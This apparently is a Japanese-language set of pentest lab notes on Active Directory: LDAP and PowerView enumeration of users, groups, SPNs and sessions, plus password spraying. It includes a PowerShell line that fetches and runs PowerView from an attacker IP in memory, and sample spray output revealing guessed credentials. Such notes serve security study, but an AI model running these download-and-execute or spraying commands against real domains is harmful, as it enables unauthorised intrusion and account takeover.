# ActiveDirectory

### ユーザ情報収集

```
net user
```

```
net user /domain
```

```
net user jeff_admin /domain
```

```
net group /domain
```

```
whoami /priv
```

```
whoami /groups
```

```
net accounts
```

### ユーザ一覧の取得

```powershell
powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser
# ドメイン情報の表示
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
# LDAPプロバイダパスの作成
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$SearchString

# ドメイン内のすべてのユーザ列挙
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368" #filterプロパティに0x30000000（10進数805306368）を指定
$Searcher.FindAll()
Path                                                                     
----                                                                     
LDAP://CN=Administrator,CN=Users,DC=xor,DC=com

# ユーザーのプロパティ情報含めて表示
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

### SPN収集

```powershell
# SPNに絞ってユーザ一覧化
$Searcher.filter="serviceprincipalname=*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

### Group収集

```powershell
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.name
}
```

### グループ内のメンバーのみ表示

```powershell
$Searcher.filter="(name=Domain Admins)"   
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.member
}
```

### ログオンユーザ情報を取得

```bash
cp /home/kali/Documents/tools/PowerSploit/Recon/PowerView.ps1 ./
```

```cmd
powershell -NoProfile -ExecutionPolicy unrestricted -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.45.211/PowerView.ps1','C:\Users\public\PowerView.ps1')"
```

```cmd
powershell
Import-Module .\PowerView.ps1
```

```powershell
# 端末のログイン情報
Get-NetLoggedon -ComputerName client251
```

* -ComputerNameオプション：対象のワークステーションまたはサーバーを指定

```powershell
# ドメインコントローラー上のアクティブなセッション
Get-NetSession -ComputerName dc01
```

```cmd
# インメモリーで実施
powershell.exe -NoProfile -ExecutionPolicy unrestricted IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.250:8000/PowerView.ps1')
```

![image-20230220230444452](img/ActiveDirectory_enume/image-20230220230444452.png)

※末尾に実行したコマンドを付ける

### SPNの調査

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```

### SPNからIPアドレスの抽出まで(nslookup)

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*sql*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
        $SPN_initial = $prop.serviceprincipalname
        $SPN = $SPN_initial.split("/")[1].split(":")[0]
        Write-Host ""
        Write-Host "Sam Account Name : [+]" $prop.samaccountname n
        Write-Host "Service Principal Name : [+]" $SPN n
 
        If ($SPN -like "*.com") {
        nslookup $SPN
        }
    }
        Write-Host "--------------------------------------------------------"
}
    

```

※Get-SPNでも同様のことが実施できる

https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1



### Low and Slow Password Guessing

カウントロックポリシーを事前に確認しパスワード攻撃をユーザ全体に行う方法

#### ドメインのアカウントポリシーの確認

```cmd
net accounts

----
C:\Tools\active_directory>net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              1
Length of password history maintained:                24
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

#### powershellを利用したログイン試行

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "lab")
```

* あっている場合

  ```powershell
  PS C:\Tools\active_directory> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin",
   "lab")
  distinguishedName : {DC=corp,DC=com}
  Path              : LDAP://DC01.corp.com/DC=corp,DC=com
  ```
  
* 間違っている場合

  ```powershell
  format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect.
  "
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemExce
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.Forma
  ```

#### Spray-Passwords.ps1を利用する方法

https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

```
PS C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'adam' = 'Qwerty09!'
Guessed password for user: 'iis_service' = 'Qwerty09!'
Guessed password for user: 'sql_service' = 'Qwerty09!'
Users guessed are:
 'adam' with password: 'Qwerty09!'
 'iis_service' with password: 'Qwerty09!'
 'sql_service' with password: 'Qwerty09!'
PS C:\Tools\active_directory>
```

* -File：ワードリストファイル
* -Adminフラグ：管理者アカウントのテスト

### runasコマンド

```
runas /user:＜ユーザー名＞ ＜コマンド＞
```

